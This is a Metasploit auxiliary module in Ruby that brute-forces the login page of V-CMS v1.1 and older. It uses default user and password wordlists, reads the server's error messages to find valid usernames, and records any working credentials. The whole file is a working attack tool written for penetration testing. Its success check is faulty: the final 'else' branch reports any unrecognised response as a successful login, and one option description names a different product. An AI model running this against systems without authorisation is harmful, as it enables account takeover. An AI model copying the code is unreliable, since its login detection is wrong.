##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'V-CMS Login Utility',
      'Description'    => %q{
          This module attempts to authenticate to an English-based V-CMS login interface.
        It should only work against version v1.1 or older, because these versions do not
        have any default protections against bruteforcing.
      },
      'Author'         => [ 'sinn3r' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
        OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/vcms2/'])
      ], self.class)
  end


  def get_sid
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => @uri.path
    })

    # Get the PHP session ID
    m = res.headers['Set-Cookie'].match(/(PHPSESSID=.+);/)
    id = (m.nil?) ? nil : m[1]

    return id
  end

  def do_login(user, pass)
    begin
      sid = get_sid
      res = send_request_cgi({
        'uri'    => "#{@uri}process.php",
        'method' => 'POST',
        'cookie' => sid,
        'vars_post' => {
          'user'     => user,
          'pass'     => pass,
          'sublogin' => '1'
        }
      })

      location = res.headers['Location']

      res = send_request_cgi({
        'uri' => location,
        'method' => 'GET',
        'cookie' => sid
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      vprint_error("#{@peer} - Service failed to respond")
      return :abort
    end

    if res
      case res.body
      when /User name does not exist/
        return :skip_user
      when /User name is not alphanumeric/
        return :skip_user
      when /User name not entered/
        return :skip_user
      when /User name already confirmed/
        return :skip_user
      when /Invalid password/
        vprint_status("#{@peer} - Username found: #{user}")
      else /\<a href="process\.php\?logout=1"\>/
        print_good("#{@peer} - Successful login: \"#{user}:#{pass}\"")
        report_auth_info({
          :host        => rhost,
          :port        => rport,
          :sname       => (ssl ? 'https' : 'http'),
          :user        => user,
          :pass        => pass,
          :proof       => "logout=1",
          :source_type => 'user_supplied'
        })
        return :next_user
      end
    end

    return
  end

  def run
    @uri = normalize_uri(target_uri.path)
    @uri.path << "/" if @uri.path[-1, 1] != "/"
    @peer = "#{rhost}:#{rport}"

    each_user_pass { |user, pass|
      vprint_status("#{@peer} - Trying \"#{user}:#{pass}\"")
      do_login(user, pass)
    }
  end
end
